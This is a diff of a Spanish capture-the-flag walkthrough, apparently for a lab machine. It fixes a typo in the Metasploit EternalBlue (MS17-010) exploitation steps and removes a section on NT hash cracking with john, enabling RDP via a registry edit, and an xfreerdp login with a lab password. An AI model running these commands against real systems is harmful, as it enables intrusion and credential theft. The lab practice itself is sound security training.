@@ -47,7 +47,7 @@ Encontramos el exploit Eternalblue, disponible para metasploit
 sudo msfdb init
 msfconsole -q
 ```
-search enternalblue
+search eternalblue
 use exploit/windows/smb/ms17_010_eternalblue
 set RHOST <ip-blue>
 set LHOST <ip-kali>
@@ -56,37 +56,5 @@ exploit
 `sysinfo`
 `ps`
 migrate -N winlogon.exe
-search -f flag*
-shell
-wmic useraccount get name,sid
-run winenum
-
-## Crackeo de contraseñas
-
-```
 hashdumpd
-```
-
-### Opción 1
-
-```
-sudo gunzip /usr/share/wordlists/rockyou.txt.gz
-sudo john --format=NT --wordlist=/usr/share/wordlists/rockyou.txt hashes
-```
-
-### Opción 2
-
-https://crackstation.net/
-
-
-Para permitir RDP:
-
-```
-shell
-reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
-```
-
-
-```
-xfreerdp /v:$IP /u:jon /p:alqfna22 /size:840x600 /tls-seclevel:0 /timeout:80000
 ```
